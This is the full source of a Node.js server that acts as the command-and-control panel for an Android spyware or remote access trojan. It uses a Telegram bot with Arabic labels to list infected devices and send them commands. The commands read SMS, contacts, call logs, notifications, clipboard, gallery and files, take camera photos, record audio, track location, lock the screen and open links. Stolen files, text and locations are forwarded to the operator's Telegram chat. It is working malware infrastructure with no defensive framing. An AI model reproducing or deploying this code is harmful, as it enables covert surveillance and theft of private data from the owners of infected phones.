require('dotenv').config();
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = process.env.TG_TOKEN;
const id = process.env.TG_ID;
const AGENT_SECRET = process.env.AGENT_SECRET || 'default_secret';

if (!token || !id) { console.error('Missing tokens'); process.exit(1); }

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json({ limit: '100mb' }));

app.get('/health', (req, res) => res.status(200).send('OK'));
app.get('/', (req, res) => res.send('<h1>Service Online</h1>'));

// ==================== UPLOADS ====================
app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    const ext = req.file.originalname.split('.').pop().toLowerCase();
    const caption = `°• ملف من <b>${req.headers.model || '?'}</b>\n📄 ${req.file.originalname}`;
    if (['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
        appBot.sendPhoto(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    } else if (['mp3', 'ogg', 'wav', 'm4a'].includes(ext)) {
        appBot.sendAudio(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    } else if (['mp4', 'avi', 'mov'].includes(ext)) {
        appBot.sendVideo(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    } else {
        appBot.sendDocument(id, req.file.buffer, { caption, parse_mode: 'HTML' },
            { filename: req.file.originalname }).catch(() => {});
    }
    res.send('');
});

app.post('/uploadText', (req, res) => {
    const title = req.body.title || 'نص';
    appBot.sendMessage(id,
        `°• ${title} من <b>${req.body.agentId || '?'}</b>\n\n<pre>${(req.body.text || '').substring(0, 4000)}</pre>`,
        { parse_mode: 'HTML' }
    ).catch(() => {});
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon).catch(() => {});
    appBot.sendMessage(id, `📍 موقع من <b>${req.body.agentId || '?'}</b>`, { parse_mode: 'HTML' }).catch(() => {});
    res.send('');
});

// ==================== WEBSOCKET ====================
appSocket.on('connection', (ws, req) => {
    const authKey = req.headers['x-agent-key'];
    if (AGENT_SECRET !== 'default_secret' && authKey !== AGENT_SECRET) {
        ws.close(1008, 'Unauthorized'); return;
    }
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const provider = req.headers.provider || 'N/A';

    ws.uuid = uuid;
    ws.isAlive = true;
    appClients.set(uuid, { model, battery, version, provider });

    appBot.sendMessage(id,
        `🟢 <b>جهاز جديد متصل</b>\n\n` +
        `📱 الموديل: <b>${model}</b>\n` +
        `🔋 البطارية: <b>${battery}</b>\n` +
        `🤖 النظام: <b>${version}</b>\n` +
        `📶 المزود: <b>${provider}</b>\n` +
        `🆔 ID: <code>${uuid}</code>`,
        { parse_mode: 'HTML' }
    ).catch(() => {});

    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id, `🔴 قطع الاتصال\n• ${model}`, { parse_mode: 'HTML' }).catch(() => {});
    });
    ws.on('error', (e) => console.error('WS:', e.message));
});

// ==================== KEYBOARD ====================
const kbMain = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [['📱 الاجهزة المتصلة'], ['🎮 تنفيذ الامر']],
        resize_keyboard: true
    }
};

const cmdsForDevice = (uuid) => ({
    inline_keyboard: [
        [{ text: '📊 معلومات الجهاز', callback_data: `device_info:${uuid}` },
         { text: '📦 التطبيقات', callback_data: `apps:${uuid}` }],
        [{ text: '📁 ملفات', callback_data: `file:${uuid}` },
         { text: '🖼️ صور المعرض', callback_data: `gallery:${uuid}` }],
        [{ text: '📍 الموقع', callback_data: `location:${uuid}` },
         { text: '📸 كاميرا أمامية', callback_data: `camera_back:${uuid}` }],
        [{ text: '🤳 كاميرا سلفي', callback_data: `camera_front:${uuid}` },
         { text: '🎤 تسجيل صوت', callback_data: `mic:${uuid}` }],
        [{ text: '📋 الحافظة', callback_data: `clipboard:${uuid}` },
         { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
        [{ text: '💬 الرسائل', callback_data: `messages:${uuid}` },
         { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
        [{ text: '🔔 الإشعارات', callback_data: `notifications:${uuid}` },
         { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }],
        [{ text: '🔒 قفل الشاشة', callback_data: `lock:${uuid}` },
         { text: '🌐 فتح رابط', callback_data: `open_url:${uuid}` }],
        [{ text: '🔙 رجوع', callback_data: `back:${uuid}` }]
    ]
});

// ==================== MESSAGES ====================
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId.toString() !== id.toString()) return;

    const text = message.text;

    if (text === '/start') {
        appBot.sendMessage(id, '👑 <b>لوحة التحكم</b>\n\nاختر من الأزرار:', kbMain);
        return;
    }

    if (text === '📱 الاجهزة المتصلة' || text === 'الاجهزة المتصلة') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد اجهزة');
        let t = '📱 <b>الأجهزة المتصلة:</b>\n\n';
        appClients.forEach((v, k) => {
            t += `• <b>${v.model}</b>\n   🔋 ${v.battery} | 🤖 ${v.version}\n   🆔 <code>${k}</code>\n\n`;
        });
        appBot.sendMessage(id, t, { parse_mode: 'HTML' });
        return;
    }

    if (text === '🎮 تنفيذ الامر' || text === 'تنفيذ الامر') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد اجهزة');
        const kb = [];
        appClients.forEach((v, k) => {
            kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]);
        });
        appBot.sendMessage(id, '🎮 حدد الجهاز:', { reply_markup: { inline_keyboard: kb } });
        return;
    }
});

// ==================== CALLBACK ====================
appBot.on('callback_query', async (cb) => {
    const msg = cb.message;
    const [cmd, uuid] = cb.data.split(':');
    const agent = uuid ? appClients.get(uuid) : null;

    const sendCmd = (cmdStr) => {
        let sent = false;
        appSocket.clients.forEach((ws) => {
            if (ws.uuid === uuid) { ws.send(cmdStr); sent = true; }
        });
        return sent;
    };

    const delAndSend = async (text) => {
        await appBot.deleteMessage(id, msg.message_id).catch(() => {});
        await appBot.sendMessage(id, text, kbMain).catch(() => {});
    };

    if (cmd === 'device') {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
        await appBot.editMessageText(
            `🎮 <b>${agent.model}</b>\n\nاختر الأمر:`,
            { chat_id: id, message_id: msg.message_id, parse_mode: 'HTML',
              reply_markup: cmdsForDevice(uuid) }
        ).catch(() => {});
        return;
    }

    if (cmd === 'back') {
        const kb = [];
        appClients.forEach((v, k) => {
            kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]);
        });
        await appBot.editMessageText('🎮 حدد الجهاز:', {
            chat_id: id, message_id: msg.message_id,
            reply_markup: { inline_keyboard: kb }
        }).catch(() => {});
        return;
    }

    // ===== INSTANT COMMANDS =====
    const instant = ['device_info', 'apps', 'location', 'clipboard', 'vibrate',
                     'calls', 'messages', 'contacts', 'notifications',
                     'camera_back', 'camera_front', 'gallery', 'lock'];

    if (instant.includes(cmd)) {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
        sendCmd(cmd);
        await delAndSend(`✅ تم إرسال الأمر: <b>${cmd}</b>\n⏳ انتظر النتيجة...`);
        return;
    }

    // ===== COMMANDS WITH INPUT =====
    const needsInput = {
        'file': ['📁 أدخل مسار الملف:', 'file_input'],
        'mic': ['🎤 أدخل مدة التسجيل بالثواني:', 'mic_input'],
        'open_url': ['🌐 أدخل الرابط:', 'url_input']
    };

    if (needsInput[cmd]) {
        const [prompt, session] = needsInput[cmd];
        await appBot.sendMessage(id, prompt, {
            reply_markup: { force_reply: true }
        });
        return;
    }

    // ===== REPORT FROM AGENT (via HTTP endpoints already handled)
});

// ==================== PING ====================
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        try { ws.ping(); } catch (e) {}
    });
}, 30000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ Server on ${PORT}`));
